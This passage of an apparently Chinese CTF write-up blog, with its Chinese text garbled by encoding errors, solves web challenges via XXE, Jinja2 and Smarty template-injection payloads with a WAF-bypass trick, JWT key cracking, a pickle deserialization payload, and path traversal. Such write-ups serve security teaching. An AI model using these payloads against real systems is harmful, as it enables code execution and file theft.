¸å¿ƒæ–‡ä»¶æ˜¯<code>/etc/hosts</code>å’Œ<code>/proc/net/arp</code>ï¼Œç”¨æ¥æŸ¥çœ‹å†…ç½‘å­˜æ´»çš„ä¸»æœºIP</p><p>åªæœ‰<code>/proc/net/arp</code>æœ‰å‡ºç°å†…ç½‘IPï¼Œç›´æ¥è¯»å–çœ‹çœ‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hacker</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://10.0.96.2&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å•¥æœ‰ç”¨çš„å›æ˜¾ï¼Œç›´æ¥çˆ†ipçš„cæ®µ</p><p><img src="https://i.loli.net/2021/04/24/d1XVvrb5qakgt4h.png"></p><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>åœ¨è§£å¯†ç•Œé¢è¾“å…¥ä¸€äº›éšæœºå­—ç¬¦ä¸²ï¼Œå‡ºç°äº†æŠ¥é”™å›æ˜¾ï¼Œæ˜¾ç¤ºå‡ºäº†ä¸€éƒ¨åˆ†æºä»£ç </p><p>å‘ç°å¯ä»¥SSTIï¼Œè€Œä¸”æœ‰ä¸ªwafè¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œç›´æ¥æŸ¥çœ‹æºä»£ç çœ‹çœ‹wafé‡Œæœ‰ä»€ä¹ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°wafçš„æºä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>è™½ç„¶è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç”¨å­—ç¬¦ä¸²æ‹¼æ¥æ¥è¿›è¡Œæ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°ç›®å½•ï¼Œçœ‹è§ä¸ª<code>this_is_the_flag.txt</code>ï¼Œä½†æ˜¯flagè¢«è¿‡æ»¤äº†</p><p>æ‰€ä»¥å¯ä»¥è¿™æ ·å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><blockquote><p>flag{2f47beb4-67e1-40f4-b9f3-444d0003f7b7}</p></blockquote><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>é¢˜ç›®æç¤ºè¯´è¦ä¹°åˆ°lv6ï¼Œæ•´ä¸ªè„šæœ¬è·‘ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;utl_here/shop?page=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2000</span>):</span><br><span class="line">    r = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç»“è´¦çš„æ—¶å€™å‘ç°è¦<code>1145141919.0</code>æ‰èƒ½ä¹°ä¸‹ï¼Œåº”è¯¥æ˜¯è¦æŠ“åŒ…æ”¹ä¸€ä¸‹</p><p><img src="https://i.loli.net/2021/04/20/3UkrX7lyMep8Obz.png"></p><p>æ”¹ä¸€ä¸‹æŠ˜æ‰£ï¼Œå‘ç°éœ€è¦adminæ‰èƒ½è¿›å…¥</p><h3 id="JWTè§£å¯†"><a href="#JWTè§£å¯†" class="headerlink" title="JWTè§£å¯†"></a>JWTè§£å¯†</h3><p>é‡æ–°æŠ“åŒ…ï¼Œå‘ç°äº†JWTï¼Œè¿›<a href="https://jwt.io/">JWTè§£å¯†ç½‘ç«™</a>è§£å‡ºæ¥</p><p>ç„¶åç”¨<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>è§£å‡ºkeyä¸º<code>1Kun</code>ï¼ˆtipsï¼škè¦å¤§å†™</p><p>æœ€åå†é‡æ–°ç”Ÿæˆä¸€ä¸‹JWT</p><p><img src="https://i.loli.net/2021/04/21/nimrRTh682gJpaV.png"></p><p>æŠ“åŒ…ä¸Šä¼ ä¸€ä¸‹ï¼ŒæˆåŠŸè¿›å…¥</p><h3 id="pythonååºåˆ—åŒ–æ¼æ´"><a href="#pythonååºåˆ—åŒ–æ¼æ´" class="headerlink" title="pythonååºåˆ—åŒ–æ¼æ´"></a>pythonååºåˆ—åŒ–æ¼æ´</h3><p>æºä»£ç å†…å‘ç°ä¸€ä¸ª<a href="http://www.zip/">www.zip</a></p><p><img src="https://i.loli.net/2021/04/21/5g1Sa23WAjf8tGR.png"></p><p>ä¸‹è½½åè¿›å…¥Admin.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹å‡ºä½¿ç”¨äº†tornadoçš„<code>get_argument</code>è¿›è¡Œè·å–becomeå˜é‡ï¼Œç„¶åä½¿ç”¨<code>pickle</code>è¿›è¡Œåºåˆ—åŒ–ï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ç‚¹</p><p>å…·ä½“çœ‹è¿™é‡Œ<a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">å…³äºPython secçš„ä¸€äº›ç®€å•çš„æ€»ç»“</a>è¿˜æœ‰è¿™é‡Œ<a href="https://xz.aliyun.com/t/2289#toc-5">Pythonååºåˆ—åŒ–æ¼æ´çš„èŠ±å¼åˆ©ç”¨</a></p><p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;, &#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ç®—å‡ºæ¥æå–flagçš„becomeå€¼ï¼Œç„¶åå†æäº¤ä¸€æ¬¡å°±å¯ä»¥æ‹¿åˆ°flagäº†</p><blockquote><p>flag{a18502ab-fc97-410e-8bb7-744f815d7601}</p></blockquote><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><h3 id="smartyçš„SSTI"><a href="#smartyçš„SSTI" class="headerlink" title="smartyçš„SSTI"></a>smartyçš„SSTI</h3><p>çœ‹åˆ°smartyæ—¶æƒ³åˆ°äº†SSTIï¼Œå¹¶ä¸”æç¤ºæ³¨å…¥ç‚¹åœ¨X-Forwarded-Forï¼Œç®€å•æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;7 * 7&#125;&#125;</span><br></pre></td></tr></table></figure><p>å›æ˜¾å‡º49ï¼Œè¯´æ˜å­˜åœ¨smartySSTIï¼ŒæŸ¥äº†ä¸€ä¸‹å¸¸ç”¨çš„payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123; readfile(<span class="string">&#x27;/flag&#x27;</span>) &#125;</span><br><span class="line">&#123;<span class="keyword">if</span> show_source(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat ../../../flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ°flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><p>æ³¨å†Œç™»é™†åæœ‰ä¸ªä¸Šä¼ æ–‡ä»¶çš„æŒ‰é’®ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯uploadçš„ï¼Œä½†æ˜¯ä¼ äº†ç‚¹ä¸œè¥¿éƒ½æ²¡å•¥ååº”ï¼Œä¹Ÿä¸çŸ¥é“ä¸Šä¼ ç›®å½•åœ¨å“ªï¼Œç‚¹ä¸‹è½½çš„æ—¶å€™æŠ“åŒ…å‘ç°äº†ä¸€ä¸ª<code>filename</code>ï¼Œåº”è¯¥å¯ä»¥æŠŠéœ€è¦çš„æ–‡ä»¶ä¸‹ä¸‹æ¥çœ‹æºç </p><blockquote><p>../../index.php</p><p>../../download.php</p><p>../../delete.php</p><p>../../class.php (è¿™ä¸ªæ˜¯ä¸‹å®Œindex.phpååœ¨é‡Œé¢çœ‹åˆ°includeçš„</p></blockquote><h3 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h3><p><a href="https://xz.aliyun.com/t/2715">è¿™é‡Œæ˜¯åŸç†</a></p><p>çœ‹çœ‹class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; 